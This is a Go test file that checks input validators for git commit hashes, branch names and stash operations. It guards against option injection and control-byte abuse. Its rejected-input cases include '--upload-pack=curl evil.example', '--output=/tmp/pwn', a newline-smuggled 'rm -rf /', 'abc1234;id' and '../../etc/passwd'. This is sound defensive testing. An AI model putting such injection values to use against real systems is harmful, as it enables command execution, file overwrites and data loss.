package httpapi

import (
	"slices"
	"strings"
	"testing"
)

// Validation for the strings this package turns into git argv.
//
// `gitExec` builds a []string and never a shell string, so quoting is not the
// exposure — option injection (a leading "-" read as a flag) and refspec
// traversal are. This is the one piece of that surface that is a pure function
// and therefore unit-testable; the handlers themselves are covered by tier-2
// integration against a real VM, because `Server.orch` is a concrete
// *orchestrator.Orchestrator with no exec seam to fake (the same gap already
// recorded for checkFile/formatFile in TODO.md and as BUG-003's residual).
func TestValidCommitHash(t *testing.T) {
	valid := []string{
		"abc1234", // the 7-char abbreviation git prints
		"ABC1234", // uppercase hex is a real object name
		"0123456789abcdef0123456789abcdef01234567", // full 40
		"deadbeef",
	}
	for _, h := range valid {
		if !validCommitHash(h) {
			t.Errorf("validCommitHash(%q) = false, want true", h)
		}
	}

	invalid := []struct{ in, why string }{
		{"", "empty"},
		{"abc123", "6 chars, shorter than git's own abbreviation"},
		{"0123456789abcdef0123456789abcdef012345678", "41 chars, longer than a sha1"},
		{"--output=/tmp/x", "leading dash would be read as an option, not a revision"},
		{"-abc1234", "leading dash"},
		{"abc123g", "g is not hex"},
		{"HEAD", "a ref name, not a hash"},
		{"HEAD@{1}", "reflog syntax"},
		{"abc1234^", "parent syntax"},
		{"abc1234..def5678", "range syntax"},
		{"abc1234 --output=x", "embedded space and flag"},
		{"../../etc/passwd", "path traversal"},
		{"abc1234\nrm -rf /", "embedded newline"},
		{"abc1234;id", "shell metacharacter"},
		{"abc1234\x00", "embedded NUL"},
	}
	for _, c := range invalid {
		if validCommitHash(c.in) {
			t.Errorf("validCommitHash(%q) = true, want false (%s)", c.in, c.why)
		}
	}
}

func TestValidBranchName(t *testing.T) {
	valid := []string{
		"main",
		"feature/add-widget",
		"release-1.2",
		"user/kesokaj/fix",
		"ünïcode-branch", // git allows non-ASCII; only controls are barred
		"a",
	}
	for _, b := range valid {
		if !validBranchName(b) {
			t.Errorf("validBranchName(%q) = false, want true", b)
		}
	}

	invalid := []struct{ in, why string }{
		{"", "empty"},
		{"-b", "leading dash: git would read it as an option"},
		{"--output=/tmp/pwn", "leading dash, and an option that WRITES"},
		{"--upload-pack=curl evil.example", "the classic argv-injection shape"},
		{"has space", "space is not a legal ref character"},
		{"nul\x00byte", "NUL"},
		{"newline\nbranch", "newline could forge a second log line"},
		{"tab\tbranch", "control byte"},
		{"esc\x1b[31m", "ANSI escape could rewrite a confirmation dialog"},
		{"del\x7f", "DEL"},
		{"c1\x9b", "C1 control"},
	}
	for _, c := range invalid {
		if validBranchName(c.in) {
			t.Errorf("validBranchName(%q) = true, want false (%s)", c.in, c.why)
		}
	}

	// Length is bounded, and the bound is inclusive.
	if !validBranchName(strings.Repeat("a", maxRefLen)) {
		t.Errorf("a %d-char name should be accepted", maxRefLen)
	}
	if validBranchName(strings.Repeat("a", maxRefLen+1)) {
		t.Errorf("a %d-char name should be rejected", maxRefLen+1)
	}
}

// Names that are merely INVALID as refs are deliberately NOT rejected here —
// git is the authority on its own ref format, and duplicating those rules in
// Go would mean silently drifting from a spec we do not own. This test pins
// that as a decision so nobody "fixes" it into a partial reimplementation.
func TestValidBranchNameDefersRefFormatToGit(t *testing.T) {
	deferred := []string{"a..b", "a@{0}", "a.lock", "trailing/", "/leading", "a~1", "a^", "a:b", "a?", "a*", "a["}
	for _, b := range deferred {
		if !validBranchName(b) {
			t.Errorf("validBranchName(%q) = false; ref-format validity is git's "+
				"call, this gate only stops argv abuse", b)
		}
	}
}

func TestStashOpsIsAClosedSet(t *testing.T) {
	for _, bad := range []string{"", "drop", "clear", "apply", "branch", "PUSH", "push -u", "--all"} {
		if _, ok := stashOps[bad]; ok {
			t.Errorf("stashOps accepted %q; the set must stay closed", bad)
		}
	}
	// `push` must carry -u, or a stash silently strands untracked work.
	got, ok := stashOps["push"]
	if !ok {
		t.Fatal("stashOps lost its push entry")
	}
	if !slices.Contains(got, "-u") {
		t.Errorf("stash push = %v, want it to include -u (untracked files)", got)
	}
	// `list` must stay machine-parseable server-side; the frontend must never
	// be handed raw porcelain to parse.
	if !slices.Contains(stashOps["list"], "--format=%gd%x00%gs") {
		t.Errorf("stash list = %v, want a NUL-separated --format", stashOps["list"])
	}
}
